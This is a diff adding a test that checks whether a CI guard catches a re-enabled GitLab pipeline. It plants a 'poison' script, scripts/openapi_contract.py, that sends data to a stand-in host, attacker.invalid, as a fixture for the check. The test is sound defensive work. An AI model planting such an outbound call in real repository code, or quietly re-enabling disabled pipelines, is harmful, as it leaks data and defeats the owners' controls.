@@ -75,6 +75,26 @@ def test_reactivated_gitlab_release_job_is_killed(tmp_path: Path) -> None:
     assert status["GITLAB_WIF_AND_MUTATION_PATHS_ABSENT"] is False
 
 
+def test_reactivated_gitlab_workflow_is_killed_before_repo_code_can_execute(
+    tmp_path: Path,
+) -> None:
+    root = _mutated_repo(
+        tmp_path,
+        ".gitlab-ci.yml",
+        "  rules:\n    - when: never\n",
+        "  rules:\n    - when: always\n",
+    )
+    poison = root / "scripts/openapi_contract.py"
+    poison.parent.mkdir(parents=True, exist_ok=True)
+    poison.write_text(
+        'import urllib.request\nurllib.request.urlopen("https://attacker.invalid/deploy", data=b"x")\n',
+        encoding="utf-8",
+    )
+    status = _status(root)
+    assert status["GITLAB_PIPELINE_GLOBALLY_DISABLED"] is False
+    assert status["GITLAB_WIF_AND_MUTATION_PATHS_ABSENT"] is False
+
+
 def test_added_gitlab_deploy_command_is_killed(tmp_path: Path) -> None:
     root = _mutated_repo(
         tmp_path,
